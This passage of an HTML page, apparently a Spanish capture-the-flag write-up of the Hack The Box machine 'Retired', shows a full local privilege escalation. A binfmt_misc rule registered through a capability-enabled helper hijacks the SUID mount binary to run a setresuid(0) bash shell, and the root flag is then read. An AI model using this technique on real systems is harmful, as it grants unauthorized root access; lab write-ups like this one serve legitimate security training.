+        perror("close");
+
+    return 0;
+}
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~/emuemu</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo interesante esta en el archivo <code class="language-plaintext highlighter-rouge">Makefile</code>, analizemoslo poco a poco, primero setea una capability <code class="language-plaintext highlighter-rouge">cap_dac_override=ep</code> al binario <code class="language-plaintext highlighter-rouge">reg_helper</code> de emuemu</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~/emuemu</span><span class="p">$ cat Makefile 
+CC := gcc
+CFLAGS := -std=c99 -Wall -Werror -Wextra -Wpedantic -Wconversion -Wsign-conversion  
+
+SOURCES := $(wildcard *.c)
+TARGETS := $(SOURCES:.c=)
+
+.PHONY: install clean
+
+install: $(TARGETS)
+	@echo "[+] Installing program files"
+	install --mode 0755 emuemu /usr/bin/
+	mkdir --parent --mode 0755 /usr/lib/emuemu /usr/lib/binfmt.d
+	install --mode 0750 --group dev reg_helper /usr/lib/emuemu/
+	setcap cap_dac_override=ep /usr/lib/emuemu/reg_helper
+
+	@echo "[+] Register OSTRICH ROMs for execution with EMUEMU"
+	echo ':EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:' \
+		| tee /usr/lib/binfmt.d/emuemu.conf \
+		| /usr/lib/emuemu/reg_helper
+
+clean:
+	rm -f -- $(TARGETS)
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~/emuemu</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esto podemos comprobarlo usando <code class="language-plaintext highlighter-rouge">getcap</code> sobre el binario <code class="language-plaintext highlighter-rouge">reg_helper</code> indicado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ /sbin/getcap /usr/lib/emuemu/reg_helper  
+/usr/lib/emuemu/reg_helper cap_dac_override=ep
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ademas de ello hace un <code class="language-plaintext highlighter-rouge">echo</code> de una cadena la cual esta separada por <code class="language-plaintext highlighter-rouge">:</code> y hace un <code class="language-plaintext highlighter-rouge">tee</code> sobre <code class="language-plaintext highlighter-rouge">emuemu.conf</code> para escribir el output del echo en este archivo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /usr/lib/binfmt.d/emuemu.conf
+:EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:  
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Leyendo un poco de documentacion encontramos lo que significa cada serparacion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">:name:type:offset:magic:mask:interpreter:flags  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El <code class="language-plaintext highlighter-rouge">Makefile</code> tambien toma el output del echo para pasarselo como input a <code class="language-plaintext highlighter-rouge">reg_helper</code> el cual crea un archivo de configuración con el nombre, en el podemos ver los valores de las separaciones como el <code class="language-plaintext highlighter-rouge">interprete</code> y los <code class="language-plaintext highlighter-rouge">magicbytes</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /proc/sys/fs/binfmt_misc/EMUEMU  
+enabled
+interpreter /usr/bin/emuemu
+flags: 
+offset 0
+magic 13374f53545249434800524f4d00
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Cuando ejecutemos un binario correspondiente a los <code class="language-plaintext highlighter-rouge">magicbyte</code> especificados este usara el <code class="language-plaintext highlighter-rouge">interprete</code> que en este caso es el binario <code class="language-plaintext highlighter-rouge">emuemu</code> para ejecutarlo</p>
+
+<p class="plain-text">Mirando las <code class="language-plaintext highlighter-rouge">flags</code> en la documentacion podemos ver la flag <code class="language-plaintext highlighter-rouge">C</code> que sirve para tomar las <code class="language-plaintext highlighter-rouge">credenciales</code> del binario al que pertenecen los <code class="language-plaintext highlighter-rouge">magicbytes</code> y no del inteprete</p>
+<a href="/htb/retired/8.png" target="_blank"><div><p><img src="/htb/retired/8.png"></p></div></a>
+
+<p class="plain-text">Lo que podemos hacer es tomar los <code class="language-plaintext highlighter-rouge">magicbytes</code> de un binario <code class="language-plaintext highlighter-rouge">suid</code> y obligar que el <code class="language-plaintext highlighter-rouge">interprete</code> sea un binario personalizado que nos otorge una <code class="language-plaintext highlighter-rouge">shell</code>, para ello primero necesitamos un binario suid cualquiera, podemos usar simplemente <code class="language-plaintext highlighter-rouge">mount</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -perm -4000 2>/dev/null  
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/umount
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora usando <code class="language-plaintext highlighter-rouge">xxd</code> para convertirlo a hexadecimal y utilizando <code class="language-plaintext highlighter-rouge">expresiones</code> <code class="language-plaintext highlighter-rouge">regulares</code> podemos obtener los <code class="language-plaintext highlighter-rouge">magicbytes</code> pertenecientes al binario <code class="language-plaintext highlighter-rouge">mount</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /usr/bin/mount | xxd -ps | head -n1 | sed 's/\(..\)/\\x\1/g'
+\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\x40\x62\x00\x00\x00\x00  
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora registramos una nueva regla con el nombre <code class="language-plaintext highlighter-rouge">pwned</code> usando los <code class="language-plaintext highlighter-rouge">magicbytes</code> de <code class="language-plaintext highlighter-rouge">mount</code> ademas de la flag <code class="language-plaintext highlighter-rouge">C</code>, como interprete indicaremos a <code class="language-plaintext highlighter-rouge">/dev/shm/shell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ echo ':pwned:M::\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\x40\x62\x00\x00\x00\x00::/dev/shm/shell:C' | /usr/lib/emuemu/reg_helper  
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La configuración indica que cuando se detecte la ejecucion de un <code class="language-plaintext highlighter-rouge">binario</code>con los <code class="language-plaintext highlighter-rouge">magicbytes</code> de <code class="language-plaintext highlighter-rouge">mount</code> este tomara como interprete el binario <code class="language-plaintext highlighter-rouge">/dev/shm/shell</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /proc/sys/fs/binfmt_misc/pwned 
+enabled
+interpreter /dev/shm/shell
+flags: OC
+offset 0
+magic 7f454c4602010100000000000000000003003e0001000000406200000000  
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora solo falta crear el binario <code class="language-plaintext highlighter-rouge">shell</code>, para ello con un programa en <code class="language-plaintext highlighter-rouge">C</code> creamos un compilado que setee nuestro <code class="language-plaintext highlighter-rouge">uid</code> a <code class="language-plaintext highlighter-rouge">0</code> y nos lanze una <code class="language-plaintext highlighter-rouge">bash</code> interactiva</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">/dev/shm</span><span class="p">$ cat shell.c
+#define _GNU_SOURCE
+#include &ltstdlib.h>
+#include &ltunistd.h>
+
+int main(void) {
+    setresuid(0, 0, 0);
+    execve("/bin/bash", NULL, NULL);
+    return 0;
+}
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">/dev/shm</span><span class="p">$ gcc shell.c -o shell  
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">/dev/shm</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente ejecutamos el binario <code class="language-plaintext highlighter-rouge">mount</code> y al comparar los <code class="language-plaintext highlighter-rouge">magicbytes</code> y ser iguales este tomara como interprete <code class="language-plaintext highlighter-rouge">shell</code> que nos dara una <code class="language-plaintext highlighter-rouge">bash</code> con el uid <code class="language-plaintext highlighter-rouge">0</code> de <code class="language-plaintext highlighter-rouge">root</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ mount
+</span><span class="ve">root@retired</span><span class="p">:</span><span class="az">~</span><span class="p"># whoami
+root
+</span><span class="ve">root@retired</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
+10.10.11.154
+</span><span class="ve">root@retired</span><span class="p">:</span><span class="az">~</span><span class="p"># cat /root/root.txt 
+3b4**************************00e
+</span><span class="ve">root@retired</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
